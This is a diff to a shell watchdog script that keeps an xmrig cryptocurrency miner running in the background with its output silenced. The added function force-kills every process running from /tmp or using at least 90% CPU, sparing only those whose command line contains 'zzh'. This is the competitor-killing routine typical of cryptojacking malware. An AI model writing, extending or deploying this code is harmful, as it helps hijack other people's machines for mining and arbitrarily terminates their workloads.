@@ -9,6 +9,34 @@ while true; do
         if [ ! "$server" ]; then
             #如果不存在就重新启动
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
+            kill_sus_proc()
+{
+    ps axf -o "pid"|while read procid
+    do
+        ls -l /proc/$procid/exe | grep /tmp
+        if [ $? -ne 1 ]
+        then
+            cat /proc/$procid/cmdline| grep -a -E "zzh"
+            if [ $? -ne 0 ]
+            then
+                kill -9 $procid
+            else
+                echo "don't kill"
+            fi
+        fi
+    done
+    ps axf -o "pid %cpu" | awk '{if($2>=90.0) print $1}' | while read procid
+    do
+        cat /proc/$procid/cmdline| grep -a -E "zzh"
+        if [ $? -ne 0 ]
+        then
+            kill -9 $procid
+        else
+            echo "don't kill"
+        fi
+    done
+}
+kill_sus_proc
             #启动后沉睡10s
             sleep 10
         fi
